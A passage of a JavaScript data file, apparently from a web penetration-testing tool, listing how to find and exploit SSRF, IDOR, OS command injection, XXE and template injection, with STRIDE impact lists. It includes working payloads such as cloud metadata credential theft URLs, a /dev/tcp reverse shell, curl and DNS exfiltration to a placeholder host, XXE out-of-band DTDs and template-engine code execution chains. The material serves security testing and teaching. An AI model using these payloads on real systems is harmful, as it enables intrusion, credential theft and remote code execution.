        why: 'Requests sent through the victim session are attributed to the victim, and login CSRF inverts this to bind the victim to an attacker identity, so in either direction the attacker operates under a borrowed identity.',
      },
    },
  },

  {
    id: 'ssrf',
    name: 'Server-Side Request Forgery (SSRF)',
    summary: 'Make the server issue HTTP or other requests to a destination the attacker chooses, reaching internal systems the attacker cannot touch directly.',
    tags: ['server-side'],
    executionContext: {
      where: 'On the application server, as an outbound request from its HTTP client, originating inside the trust boundary.',
      detail: 'There is no attacker code execution in the classic sense. The server side fetching library (the process that resolves and requests the URL) is coerced into connecting to a destination the attacker chose, so the request carries the server network position and any implicit trust granted to that position. With protocol smuggling such as gopher, the server transmits attacker crafted bytes to an internal TCP service, so the real effect lands on that internal service (Redis, MongoDB, FastCGI, memcached, SMTP) rather than on the web server itself.',
    },
    howTo: [
      {
        heading: 'Root cause and impact',
        body: [
          'SSRF occurs when the server makes a network request to a destination the attacker can influence. Because that request originates from inside the network, it can reach hosts and services that are not exposed to the internet and that often trust any caller by virtue of their network position.',
          'The value of SSRF is location. It converts an external attacker into a client on the internal network, which is why it so often leads to cloud credential theft, access to internal admin panels, and chaining into other services.',
        ],
      },
      {
        heading: 'Where to look',
        body: [
          'Any feature where the server fetches a URL on your behalf: webhooks, link previews and unfurling, PDF or screenshot or thumbnail generators, import from URL, avatar or image by URL, RSS and sitemap readers, and third party integrations that call out. Parameters named url, uri, path, dest, target, feed, callback, webhook, image, or proxy are prime suspects.',
          'SSRF also hides inside parsed content. An SVG, an XML document (see XXE), an HTML to PDF renderer that follows resources, and office documents can each carry a request to an internal address even when there is no obvious url parameter.',
        ],
      },
      {
        heading: 'Confirm it and classify the channel',
        body: [
          'First prove the server makes the request. Point the parameter at a collaborator server you control and watch for the inbound hit, noting the source IP and any headers, which confirms the request came from the target infrastructure rather than your own browser.',
          'Classify the channel. Full response SSRF returns the fetched body to you, which is the strongest case. Blind SSRF returns nothing, but you can still infer results from timing and error differences, and you can exfiltrate through the out of band callback itself.',
        ],
        examples: [
          { code: "url=https://YOUR.collaborator", note: 'Baseline: confirm the fetch and capture the true source IP and headers.' },
          { code: "url=http://127.0.0.1:80/    vs    url=http://127.0.0.1:81/", note: 'Blind port probe: compare response time and error between an open and a closed port.' },
        ],
      },
      {
        heading: 'Internal reconnaissance',
        body: [
          'Use the SSRF to map the internal surface. Sweep common internal ports and hostnames and use timing or error differences to tell open from closed. Try internal service names that only resolve inside the network, and common private ranges.',
          'Once you find a live internal service, request its known paths. Many internal dashboards, message brokers, and orchestration APIs answer without authentication.',
        ],
        examples: [
          { code: "url=http://127.0.0.1:PORT/   (sweep 22,80,443,3000,5000,6379,8080,8500,9200,2379)", note: 'Redis 6379, Elasticsearch 9200, Consul 8500, etcd 2379, common app ports.' },
          { code: "url=http://internal-service.local/   url=http://kubernetes.default.svc/", note: 'Names that resolve only inside the cluster or network.' },
        ],
      },
      {
        heading: 'High value targets: cloud metadata',
        body: [
          'The cloud metadata service is the classic SSRF jackpot because it hands out temporary credentials for the instance role. Each provider has its own address, paths, and header requirements, so use the right one. Newer instances may require a token first (IMDSv2 on AWS), which is a mitigation you should note if it blocks you.',
        ],
        examples: [
          { code: "AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>", note: 'Returns temporary AccessKey, Secret, and Token for the instance role.' },
          { code: "AWS IMDSv2: needs X-aws-ec2-metadata-token from a PUT to /latest/api/token first", note: 'If required, this mitigation may stop a simple GET only SSRF.' },
          { code: "GCP: http://metadata.google.internal/computeMetadata/v1/  with header Metadata-Flavor: Google", note: 'GCP requires the custom header, so header injection may be needed.' },
          { code: "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 with header Metadata: true", note: 'Azure requires the Metadata header.' },
        ],
      },
      {
        heading: 'Bypassing allowlists and blocklists',
        body: [
          'Blocklists for localhost and 127.0.0.1 are weak because there are many equivalent ways to name the same address. Allowlists are stronger but often defeated by parser confusion in the URL, or by a redirect from an allowed host, or by DNS rebinding.',
          'DNS rebinding beats checks that resolve the hostname once to validate it and then resolve it again to fetch, by returning a public IP the first time and an internal IP the second. A redirect bypass points the allowed URL at a resource that 302s to an internal address, which many fetchers follow.',
        ],
        examples: [
          { code: "127.0.0.1 -> 127.1, 0177.0.0.1 (octal), 2130706433 (decimal), 0x7f000001 (hex), [::1], 0.0.0.0", note: 'Equivalent forms of loopback to slip past string blocklists.' },
          { code: "Allowlist bypass:  http://allowed.com@169.254.169.254/   http://169.254.169.254#allowed.com", note: 'Authority confusion: the real host is the metadata IP, not allowed.com.' },
          { code: "Redirect bypass:  point url at https://YOUR/r that returns 302 Location: http://169.254.169.254/...", note: 'Fetcher follows the redirect to the internal target.' },
          { code: "DNS rebinding:  a name whose A record flips from public to 169.254.169.254 between validation and fetch", note: 'Defeats validate then refetch logic.' },
        ],
      },
      {
        heading: 'Protocol smuggling for deeper impact',
        body: [
          'When the fetcher supports schemes beyond http, you can talk to non HTTP services. The gopher scheme lets you send arbitrary bytes to a TCP service, which is enough to write a full Redis command sequence or an SMTP conversation. The file scheme reads local files, and dict or ftp can reach other services. Availability depends entirely on the library behind the fetch.',
        ],
        examples: [
          { code: "gopher://127.0.0.1:6379/_<url-encoded Redis commands>", note: 'Drive Redis over gopher, for example to write a cron job or a web shell key.' },
          { code: "file:///etc/passwd", note: 'Local file read when the file scheme is allowed.' },
          { code: "dict://127.0.0.1:11211/stats", note: 'Reach memcached or other line protocols.' },
        ],
      },
      {
        heading: 'Proxy and parser confusion bypasses',
        body: [
          'Some frameworks and proxies parse the URL or request line loosely, which lets you point a validated request at an internal host. An absolute form request line can turn a reverse proxy into an open forward proxy. Authority parsing quirks in Flask, Spring, and the PHP built in server let an @ or ;@ sequence make the real host something other than the allowed one.',
          'When TLS is involved, a misconfigured proxy that routes by SNI can be reached with a crafted server name, and Java clients with AIA fetching enabled can be pushed to request an attacker URL during certificate handling before any HTTP logic runs.',
        ],
        examples: [
          { code: "Open forward proxy:  GET http://127.0.0.1:8080/ HTTP/1.1 (absolute form request line)", note: 'Some proxies accept absolute URLs and fetch them.' },
          { code: "Flask @ :  GET @evil.com/ HTTP/1.1     Spring ;@ :  GET ;@evil.com/ HTTP/1.1", note: 'Authority parsing quirks override the intended host.' },
          { code: "SNI routing:  openssl s_client -connect target:443 -servername internal.host", note: 'Reach an internal vhost through an SNI routed proxy.' },
        ],
      },
      {
        heading: 'Hidden fetch surfaces',
        body: [
          'SSRF is not always a url parameter. Server side renderers that turn HTML into a PDF or screenshot will follow img, link, and script URLs, so injected markup becomes a request from the server. CSS preprocessors that support import fetch remote resources at compile time. Analytics that visit the Referer header, and libraries that treat a filename as a small language with extended syntax, all create fetches you can steer.',
        ],
        examples: [
          { code: "HTML to PDF:  <img src='http://169.254.169.254/latest/meta-data/'>", note: 'The rendering backend fetches the image URL from inside the network.' },
          { code: "LESS/CSS:  @import url('http://127.0.0.1/admin');", note: 'Preprocessor fetches the import during compilation.' },
        ],
      },
      {
        heading: 'Tooling',
        body: [
          'Use an out of band interaction server (Burp Collaborator or interactsh) to catch blind callbacks and confirm the source. SSRFmap and Gopherus help build protocol smuggling payloads for known internal services. Keep a checklist of provider metadata endpoints and internal ports so you can pivot quickly once the primitive is confirmed.',
        ],
        examples: [
          { code: "interactsh-client   (then use the generated domain as your url= target)", note: 'Catch DNS and HTTP callbacks for blind SSRF.' },
          { code: "gopherus --exploit redis", note: 'Generate a gopher payload for a known internal service.' },
        ],
      },
    ],
    stride: {
      information_disclosure: {
        weaponization: [
          'Read cloud metadata to pull instance role credentials, user data, and tokens (AWS, GCP, Azure, DigitalOcean).',
          'Reach internal admin panels, dashboards, and status pages that are not exposed externally.',
          'Pull responses from internal APIs and services that trust the internal network.',
          'Read local files with the file scheme where the fetcher allows it.',
          'Enumerate internal hosts and open ports from response timing and error differences.',
          'Trigger debug or redirect chain leaks that dump otherwise invisible response bodies.',
        ],
        why: 'The request originates from inside the trust boundary, so internal services that assume any caller is already authorized hand over data they would never expose to the internet.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Steal cloud instance role credentials from the metadata service and use them against the cloud provider API.',
          'Reach internal services that grant powerful actions without authentication (orchestration, CI, message brokers).',
          'Smuggle commands over gopher to Redis or MongoDB to create an admin, write a cron job, or plant a web shell.',
          'Hit an internal FastCGI or similar over gopher to reach remote code execution on the app host.',
          'Pivot with stolen internal credentials or tokens to escalate across systems.',
        ],
        why: 'Internal services and metadata endpoints often skip authentication because they rely on network isolation, so bridging that isolation with the server own trusted position grants the attacker their privileges.',
      },
      denial_of_service: {
        weaponization: [
          'Direct the server to fetch enormous responses or endless streams to exhaust memory and bandwidth.',
          'Make the server connect to itself in a loop or fan out many internal requests.',
          'Point a Java client with AIA fetching at file:///dev/urandom so it reads unbounded data and blocks.',
          'Hammer a fragile internal service until it or the fetching service falls over.',
        ],
        why: 'The server performs whatever work the attacker requests, so controlling the destination and the size of that work lets the attacker drive resource exhaustion on the app or on an internal dependency.',
      },
      spoofing: {
        weaponization: [
          'Send requests that appear to originate from a trusted internal host, satisfying IP allowlists.',
          'Impersonate a trusted internal service to other internal systems.',
          'Turn a loose proxy into an open forward proxy so traffic appears to come from the server.',
        ],
        why: 'Downstream systems identify the caller by network origin, and SSRF lets the attacker borrow the server trusted origin so their requests are treated as internal and legitimate.',
      },
    },
  },

  {
    id: 'idor',
    name: 'Insecure Direct Object Reference (IDOR)',
    summary: 'Access or change another user\'s object by changing an identifier in the request, because the server checks authentication but not ownership.',
    tags: ['access-control'],
    executionContext: {
      where: "In the application's authorization logic on the server: this is a check the server fails to perform, not code the attacker runs.",
      detail: 'The request is an ordinary authenticated request. The flaw is that the server side handler fetches or modifies the object named by the identifier without confirming that the current user is allowed to access that specific object (also called broken object level authorization). Both the vulnerability and its impact live in the application server business logic. The attacker only changes a value in an otherwise legitimate request; there is no injection and nothing runs in the browser.',
    },
    howTo: [
      {
        heading: 'Where identifiers appear',
        body: [
          'Object references show up in the path (/api/user/1234, /files/UUID), the query string (?id=42, ?invoice=2024-00001), the body or JSON ({"user_id":321,"order_id":987}), and in headers or cookies (X-Client-ID: 4711). They also hide inside JWT claims, hidden form fields, and second order flows where an id set in step one is trusted in step two.',
          'Both reads and writes are in scope: viewing someone else record, and editing, deleting, or acting on it.',
        ],
      },
      {
        heading: 'The core test: swap the id across accounts',
        body: [
          'Create two accounts. Perform an action as account A and capture the request. Replay the same request but with account B session while keeping account A object id. If B can read or change A data, it is an IDOR. The absence of an authorization error is itself the tell, even when the object looks generic.',
          'The Client Identity view in this tool is built for exactly this: pull the identifiers out of each request first, then fuzz them across accounts.',
        ],
      },
      {
        heading: 'Identifier types and why encoding does not help',
        body: [
          'Sequential numeric ids are the highest risk because one valid id implies its neighbors exist, enabling mass enumeration. UUIDv4 and ULID are much harder to guess, but test whether one is leaked elsewhere (in another response, an email, or a referrer) or generated predictably.',
          'Encoding is not entropy. If a short id is only hex or base64 encoded, decode it, enumerate the small keyspace, and re-encode. Cosmetic encoding of a guessable value stays guessable.',
        ],
        examples: [
          { code: "Sequential:  /api/lead/64185741  ->  /api/lead/64185742  ->  ...", note: 'One valid id implies the whole range exists.' },
          { code: "Encoded but weak:  C-285-100  ->  hex 432d3238352d313030  ->  enumerate then re-encode", note: 'Decoding shows the underlying value is still short and guessable.' },
        ],
      },
      {
        heading: 'Parameter, method, and mass assignment tricks',
        body: [
          'When a direct swap is blocked, vary the shape of the request. Add an id parameter the UI never sends, change the method (GET to POST, PUT, or DELETE), send the id twice (parameter pollution) to see which copy the server trusts, or wrap the id in an array or JSON object so a different code path handles it.',
          'Mass assignment is the write side of the same problem: include extra fields the form never shows, such as role, is_admin, owner_id, or price, and see if the server binds them. Combined with an id swap this both takes over an object and elevates it.',
        ],
        examples: [
          { code: "Add param:  /api/order/view  ->  /api/order/view?user_id=VICTIM", note: 'A hidden parameter may override the server side owner.' },
          { code: "Array/JSON wrap:  id=123  ->  id[]=123  or  {\"id\":{\"$ne\":null}}", note: 'A different parser path may skip the ownership check.' },
          { code: "Mass assignment:  add \"role\":\"admin\" or \"owner_id\":ME to the update body", note: 'Bind fields the UI never exposes.' },
        ],
      },
      {
        heading: 'Enumeration and oracles',
        body: [
          'Once you find one IDOR, automate the sweep. A loop with curl, Burp Intruder, or ffuf over the id range harvests the dataset. For multi parameter objects such as a chat between two users, fuzz both ids together with a cluster style attack.',
          'Even without direct object access, subtle differences in responses become oracles: distinct error strings for a missing user versus a missing file versus a bad extension let you enumerate valid values or usernames.',
        ],
        examples: [
          { code: "ffuf -u 'https://target/api/lead/FUZZ' -w range.txt -mc 200 -fr 'not found'", note: 'Sweep the id space, keep only real records.' },
          { code: "Two-party object:  ffuf 'https://t/chat?a=A&b=B' clusterbomb over both", note: 'Combinatorial fuzz for objects keyed on a pair of ids.' },
        ],
      },
      {
        heading: 'Automation tools',
        body: [
          'Burp extensions Authorize (Autorize) and Auth Analyzer replay every request with a second, lower privileged session and flag where the authorization result did not change, which surfaces IDOR and broken access control across a whole browsing session. Auto Repeater and Turbo Intruder help with large enumeration.',
        ],
      },
    ],
    stride: {
      information_disclosure: {
        weaponization: [
          'Read another user record directly by swapping its id: profile, invoice, message, document, or ticket.',
          'Enumerate sequential ids to harvest the entire dataset of personal data in bulk.',
          'Access files or documents by id or UUID that belong to other tenants.',
          'Pull other users data through export, batch, or reporting endpoints that take ids.',
          'Use error message differences as an oracle to enumerate valid usernames or object ids.',
        ],
        why: 'The server returns the object based on the identifier alone without confirming the caller owns it, so any authenticated user can read every object simply by iterating identifiers.',
      },
      tampering: {
        weaponization: [
          'Send update requests against another user object id to change their data.',
          'Delete or cancel another user records, orders, or resources.',
          'Overwrite another user settings or preferences.',
          'Use mass assignment to set fields the form never exposes, such as price, owner, or status.',
        ],
        why: 'Missing ownership checks apply to writes as well as reads, so the same id swap that reads foreign data can also modify or destroy it.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Change the role or is_admin field on your own or another account through mass assignment.',
          'Edit organization or team membership by id to grant yourself access.',
          'Act on an admin only object that is reachable by id without an authorization check.',
          'Take over another account by changing its email or password through an IDOR on the account update endpoint.',
        ],
        why: 'When a privilege bearing object or field is reachable by identifier without an authorization check, manipulating it grants rights the account was never assigned.',
      },
    },
  },

  {
    id: 'os-command-injection',
    name: 'OS Command Injection',
    summary: 'Get user input concatenated into a shell command so the attacker\'s own commands run on the server.',
    tags: ['injection', 'server-side', 'rce'],
    executionContext: {
      where: 'On the server host, in a shell or subprocess spawned by the application, running as the application service account.',
      detail: 'The application passes attacker influenced input into a system shell through a call such as system, exec, popen, or a shell invoking spawn, and the operating system runs the attacker commands directly. The code executes on the web or app server host with the privileges of the service account, not in the browser and not in the database. This is direct code execution, so the only limits are that account privileges and whatever local escalation follows. A related variant, argument injection, runs no shell at all: the attacker instead controls arguments to a specific program, and execution happens inside that program option handling.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Any feature that shells out: ping and traceroute tools, DNS and whois lookups, file conversion and image or video processing (which often call ImageMagick or ffmpeg), archive and backup utilities, PDF generation, and admin features that run a system command with a filename or host argument. Parameters named cmd, exec, command, ping, host, ip, file, or query are common.',
        ],
      },
      {
        heading: 'Separators and chaining operators',
        body: [
          'Inject a separator so your command runs alongside the intended one. Semicolon runs sequentially, ampersand backgrounds, pipe feeds output onward, and the doubled operators run conditionally. Command substitution with backticks or a dollar sign parenthesis runs your command and inserts its output, which is useful inside an argument. A newline also acts as a separator in many contexts.',
        ],
        examples: [
          { code: "127.0.0.1; id        127.0.0.1 && whoami        127.0.0.1 | id", note: 'Sequential, conditional, and piped chaining.' },
          { code: "target`id`           target$(id)", note: 'Command substitution runs inside an argument.' },
          { code: "%0aid   (newline)", note: 'A URL encoded newline separates commands where other separators are filtered.' },
        ],
      },
      {
        heading: 'Detecting blind injection',
        body: [
          'When no output is returned, prove execution another way. A conditional sleep makes the response slow only when your command runs, and you can binary search data one character at a time by delaying only when a guessed character matches. Out of band proof is faster and more reliable: force a DNS or HTTP request to a server you control, and embed stolen data in the subdomain to exfiltrate blindly.',
        ],
        examples: [
          { code: "; sleep 5      || ping -c 5 127.0.0.1", note: 'Time based confirmation of blind execution.' },
          { code: "; if [ $(whoami|cut -c1) = r ]; then sleep 5; fi", note: 'Time based binary search of a single character.' },
          { code: "; nslookup `whoami`.YOUR.oob.domain", note: 'Out of band DNS exfiltration: the subdomain carries the stolen value.' },
        ],
      },
      {
        heading: 'Reading output and getting a shell',
        body: [
          'Where output is reflected, read files and environment directly. Where it is not, write the result to a web reachable path, or curl it to your server. Once you have reliable execution, upgrade to an interactive reverse shell for comfort, then move to local enumeration.',
        ],
        examples: [
          { code: "; cat /etc/passwd     ; env     ; cat .env config/*.yml", note: 'Read secrets and configuration.' },
          { code: "; id > /var/www/html/o.txt     ; curl https://YOUR/x -d \"$(id)\"", note: 'Exfiltrate output when it is not reflected.' },
          { code: "; bash -c 'bash -i >& /dev/tcp/YOUR/4444 0>&1'", note: 'Interactive reverse shell.' },
        ],
      },
      {
        heading: 'Bypassing space and character filters',
        body: [
          'When spaces are blocked, substitute the internal field separator variable, a tab, or brace expansion. When keywords or paths are filtered, break them with quotes or variable expansion that the shell strips before execution, or use wildcards to name a binary without typing it fully. On Windows, the caret escapes characters and wildcards match executable paths, so a command can be reassembled from fragments.',
        ],
        examples: [
          { code: "cat${IFS}/etc/passwd      cat%09/etc/passwd      {cat,/etc/passwd}", note: 'Space alternatives: IFS, tab, brace expansion.' },
          { code: "who''ami     w\\ho\\am\\i     /???/??t /etc/passwd", note: 'Quote and wildcard tricks defeat keyword and path blocklists.' },
          { code: "Windows:  who^ami     powershell c:\\*\\*\\cmd.exe", note: 'Caret escaping and wildcard paths on Windows.' },
        ],
      },
      {
        heading: 'Argument injection without metacharacters',
        body: [
          'Even when every shell metacharacter is filtered, you may control an argument that begins with a hyphen, which many programs treat as an option. That alone can write files, change behavior, or run code depending on the program. This bypasses metacharacter based filters entirely because no separator is needed.',
        ],
        examples: [
          { code: "curl target -o /var/www/html/shell.php", note: 'A leading -o turns a fetch into an arbitrary file write.' },
          { code: "tcpdump ... -z /path/script.sh", note: 'The post rotate option runs a script.' },
          { code: "ping -f (flood)   or a program that reads -T/--config from your value", note: 'Option smuggling changes behavior without any separator.' },
        ],
      },
      {
        heading: 'Tools',
        body: [
          'Commix automates detection and exploitation of command injection across many contexts and evasions. An out of band interaction server (interactsh, Burp Collaborator) catches blind DNS and HTTP callbacks. Keep per platform payload lists for quick separator and bypass switching.',
        ],
      },
    ],
    stride: {
      elevation_of_privilege: {
        weaponization: [
          'Run arbitrary commands as the service account, which is already code execution on the host.',
          'Escalate locally to root through sudo rules, SUID binaries, writable services, or a kernel exploit.',
          'Steal cloud instance role credentials from the host and use them against the cloud API.',
          'Pivot to other internal hosts using local credentials and network position.',
          'Install persistence such as a cron job, service, or authorized key.',
        ],
        why: 'Command injection is direct code execution on the server, the strongest primitive an attacker can hold, so it collapses the entire application trust model and usually leads to full host and account control.',
      },
      information_disclosure: {
        weaponization: [
          'Read configuration, environment variables, private keys, and database credentials off the filesystem.',
          'Read application source code and secrets baked into it.',
          'Enumerate the internal network and reachable services from the host.',
          'Exfiltrate any of the above over an out of band channel even when no output is reflected.',
        ],
        why: 'A shell can read whatever the service account can read, so every local secret and much of the internal network become available at once.',
      },
      tampering: {
        weaponization: [
          'Modify application files and code, or plant a web shell or backdoor.',
          'Alter data and logs to change behavior or hide activity.',
          'Change cron jobs, services, or configuration to redirect or subvert the application.',
        ],
        why: 'Write access through the shell lets the attacker change the code, configuration, and data that define how the application behaves.',
      },
      denial_of_service: {
        weaponization: [
          'Run resource exhausting commands such as a fork bomb or a flood to starve the host.',
          'Delete critical files or databases the application depends on.',
          'Stop or crash services to take the application offline.',
        ],
        why: 'Arbitrary command execution includes destructive and resource heavy operations, so taking availability down is trivial once execution is achieved.',
      },
    },
  },

  {
    id: 'xxe',
    name: 'XML External Entity (XXE)',
    summary: 'Abuse an XML parser that resolves external entities to read files, reach internal systems, or exhaust resources.',
    tags: ['injection', 'server-side', 'xml'],
    executionContext: {
      where: 'Inside the XML parser on the application server, during server side XML processing.',
      detail: 'The flaw is how the server XML parser is configured: it resolves external entities and DTDs while parsing attacker supplied XML. Entity resolution runs on the application server with its privileges, so the parser reads local files and makes network requests on the attacker behalf. Nothing runs in the browser. Where XXE reaches code execution, such as a Java XMLDecoder stream, that code also runs on the application server.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Anywhere the server parses XML you can influence: SOAP APIs, SAML assertions, RSS and sitemap imports, XML REST endpoints, and file formats that are XML underneath such as SVG, DOCX, and XLSX (XML inside a zip). Even a JSON endpoint may hide a permissive XML parser, so try switching the content type to application/xml and sending an XML body.',
        ],
      },
      {
        heading: 'Classic in band file read',
        body: [
          'Declare an external entity that points at a local file and reference it where a value is reflected. If the file content comes back in the response, you have direct XXE. On PHP, wrap the file in the base64 filter so binary or XML unsafe content survives and returns encoded.',
        ],
        examples: [
          { code: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", note: 'Direct read when the entity value is echoed back.' },
          { code: "<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">", note: 'PHP filter returns file contents base64 encoded so any bytes survive.' },
        ],
      },
      {
        heading: 'Blind and error based extraction',
        body: [
          'When nothing is reflected, use a parameter entity to make the parser fetch an external DTD from your server, and have that DTD build a second entity that appends the file content to an out of band request, exfiltrating it to you. If out of band is blocked but errors are shown, use the same nesting to force the file content into a parser error message.',
        ],
        examples: [
          { code: "<!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://YOUR/evil.dtd\"> %ext;]>", note: 'Load an attacker DTD via a parameter entity.' },
          { code: "evil.dtd:  <!ENTITY % f SYSTEM \"file:///etc/passwd\"><!ENTITY % e \"<!ENTITY &#37; x SYSTEM 'http://YOUR/?d=%f;'>\">%e;%x;", note: 'Out of band exfiltration of the file through a callback URL.' },
          { code: "Error based:  point the inner entity at file:///nonexistent/%f; so the missing path error leaks %f;", note: 'Use when OOB egress is blocked but errors are returned.' },
        ],
      },
      {
        heading: 'When egress is blocked or you cannot add a DOCTYPE',
        body: [
          'If the server cannot reach your DTD, reuse a DTD that already exists on the host (many systems ship docbook and similar DTDs) and redefine one of its parameter entities to your extraction logic. If the application blocks or ignores your DOCTYPE, XInclude injects a file read into a single element without a DOCTYPE at all.',
        ],
        examples: [
          { code: "Local DTD reuse:  load file:///usr/share/yelp/dtd/docbookx.dtd then redefine an internal parameter entity to leak a file.", note: 'Works fully offline using a DTD already on disk.' },
          { code: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>", note: 'XInclude reads a file without any DOCTYPE.' },
        ],
      },
      {
        heading: 'File format, protocol, and RCE vectors',
        body: [
          'Deliver XXE through formats the app parses server side: an uploaded SVG can read a file through an image href, and DOCX or XLSX can be unzipped, have XXE added to the inner XML, and rezipped. Java parsers extend the reach: the jar protocol reads files inside a remote archive, and an endpoint that deserializes a java.beans.XMLDecoder stream is direct remote code execution rather than a file read.',
        ],
        examples: [
          { code: "SVG upload:  <svg ...><image xlink:href=\"file:///etc/hostname\"></image></svg>", note: 'Image renderers that parse SVG read the referenced file.' },
          { code: "Java XMLDecoder:  <java class=\"java.beans.XMLDecoder\">...Runtime.exec(...)...</java>", note: 'XMLDecoder streams are code execution, not just XXE.' },
        ],
      },
      {
        heading: 'SSRF and denial of service through the parser',
        body: [
          'Because an entity can name a URL, XXE is also a server side request primitive: point it at internal services or cloud metadata to reach them from inside the network. For availability, a recursively defined entity (billion laughs) expands a tiny document into gigabytes, and an entity aimed at an endless device such as /dev/random hangs the parser.',
        ],
        examples: [
          { code: "SSRF:  <!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">", note: 'Reach cloud metadata from the parser.' },
          { code: "Billion laughs:  nested entities a1..aN each referencing the previous ten times", note: 'Exponential expansion exhausts memory.' },
        ],
      },
      {
        heading: 'Bypasses and tools',
        body: [
          'When a filter blocks the syntax, try switching the request content type to XML, encoding the DTD location with HTML numeric entities, or using an alternate text encoding such as UTF-16 or UTF-7 so the signature does not match. Burp has a Content Type Converter to turn JSON or form requests into XML, and an out of band interaction server catches blind callbacks.',
        ],
      },
    ],
    stride: {
      information_disclosure: {
        weaponization: [
          'Read local files directly (configuration, credentials, private keys, /etc/passwd) when the entity is reflected.',
          'Read source and binary safe content through the PHP base64 filter.',
          'Exfiltrate files blindly over an out of band channel using an external DTD.',
          'Leak file contents through parser error messages when out of band egress is blocked.',
          'List directories or read archive contents in parsers that support it (jar, some file handlers).',
        ],
        why: 'The parser resolves attacker defined entities with the privileges of the application, turning ordinary XML parsing into an arbitrary file read on the server.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Chain XXE into SSRF to reach cloud metadata and steal instance role credentials.',
          'Reach internal only services and admin interfaces from inside the trust boundary.',
          'Achieve remote code execution where the parser allows it, such as a Java XMLDecoder stream.',
          'Read authentication material or keys that let you forge or replay privileged access.',
        ],
        why: 'An entity can address network resources and, on some parsers, executable object graphs, so XXE becomes a server side request and sometimes a code execution primitive that reaches trusted systems.',
      },
      denial_of_service: {
        weaponization: [
          'Submit a recursively expanding entity (billion laughs) that balloons a tiny document into gigabytes of memory.',
          'Use quadratic entity blowup that is smaller but still exhausts CPU and memory.',
          'Point an entity at an endless stream such as /dev/random so the parser never finishes.',
          'Force the parser to fetch a huge or hanging external resource.',
        ],
        why: 'Naive entity expansion and external fetches multiply work far beyond the input size, so a small payload consumes disproportionate memory, CPU, or time and stalls the service.',
      },
    },
  },

  {
    id: 'ssti',
    name: 'Server-Side Template Injection (SSTI)',
    summary: 'Inject template syntax into a server rendered template so the template engine evaluates attacker expressions, often leading to code execution.',
    tags: ['injection', 'server-side', 'rce'],
    executionContext: {
      where: 'In the template engine on the application server, which evaluates the injected expression inside the server process.',
      detail: 'User input reaches a template that the server compiles and renders, so the injected template syntax is evaluated by the engine within the application process, with its privileges and access to the language runtime. This is server side, not the browser. The browser side equivalent, where a client framework evaluates the expression in the page, is client side template injection and behaves like XSS. Because template engines expose language internals, server side evaluation usually escalates to running code on the application server.',
    },
    howTo: [
      {
        heading: 'Where to look',
        body: [
          'Anywhere user input is placed into a template the server renders: email and notification templates, customizable pages and themes, generated documents, error messages, and any feature that accepts a format string or template. Common engines are Jinja2 and Mako (Python), Twig and Smarty (PHP), Freemarker, Velocity, and Spring EL or Thymeleaf (Java), ERB and Slim (Ruby), Handlebars and Pug (Node), and Razor (.NET).',
        ],
      },
      {
        heading: 'Detect evaluation, then fingerprint the engine',
        body: [
          'First prove the input is evaluated as a template rather than reflected: send an arithmetic expression in template syntax and check whether the response contains the computed result. Getting 49 back means evaluation, which is different from XSS reflection.',
          'Then identify the exact engine, because the path to code execution differs for each. Which delimiter evaluates narrows it down, and engine specific probes or a division by zero stack trace confirm it. A quick guide: {{7*7}} works in Jinja2, Twig, and Freemarker; ${7*7} in Freemarker and Spring EL; <%= 7*7 %> in ERB; #{7*7} in some Java engines. {{7*\"7\"}} returns 7777777 in Jinja2 but 49 in Twig.',
        ],
        examples: [
          { code: "{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   {7*7}", note: 'Which delimiter returns 49 tells you which family of engines is in play.' },
          { code: "${7/0}  or  {{7/0}}", note: 'A division by zero error often names the engine in the stack trace.' },
        ],
      },
      {
        heading: 'Python: Jinja2 and Mako',
        body: [
          'In Jinja2 there is no sandbox by default, so read the exposed config first, then traverse the object graph from a harmless built in to reach os.popen for command execution. Mako lets you run Python directly in a code block.',
        ],
        examples: [
          { code: "{{ config }}   {{ config.SECRET_KEY }}", note: 'Flask/Jinja2 exposes application configuration and secrets.' },
          { code: "{{ cycler.__init__.__globals__.os.popen('id').read() }}", note: 'Jinja2 RCE by traversing globals to os.popen.' },
          { code: "<%import os%>${os.popen('id').read()}", note: 'Mako runs Python directly.' },
        ],
      },
      {
        heading: 'PHP: Twig and Smarty',
        body: [
          'Twig reaches code execution by registering an undefined filter callback bound to system, then invoking it, or through file read helpers. Smarty historically allows running PHP functions directly.',
        ],
        examples: [
          { code: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", note: 'Twig RCE via a filter callback.' },
          { code: "{system('id')}", note: 'Smarty direct function execution.' },
        ],
      },
      {
        heading: 'Java: Freemarker, Velocity, and Spring EL',
        body: [
          'Freemarker exposes an Execute utility that runs commands. Velocity reaches Runtime through class reflection. Spring EL and Thymeleaf use the T() operator to call static methods such as Runtime.exec, and when a delimiter is filtered you can rotate between the dollar, hash, star, and other expression forms.',
        ],
        examples: [
          { code: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", note: 'Freemarker command execution via the Execute utility.' },
          { code: "${T(java.lang.Runtime).getRuntime().exec('id')}", note: 'Spring EL uses T() to reach a static Runtime.exec.' },
          { code: "Velocity:  reflect to Runtime via $string.class.forName('java.lang.Runtime')", note: 'Class reflection to reach Runtime.exec.' },
        ],
      },
      {
        heading: 'Ruby, Node, and .NET',
        body: [
          'ERB runs Ruby directly. Handlebars and Pug reach child_process through a prototype or require chain. Razor runs .NET, so you can start a process or reflect to load assemblies.',
        ],
        examples: [
          { code: "ERB:  <%= system('id') %>   or   <%= `id` %>", note: 'Ruby ERB executes commands directly.' },
          { code: "Pug:  #{root.process.mainModule.require('child_process').execSync('id')}", note: 'Node Pug reaches child_process.' },
          { code: "Razor:  @System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\")", note: '.NET Razor starts a process.' },
        ],
      },
      {
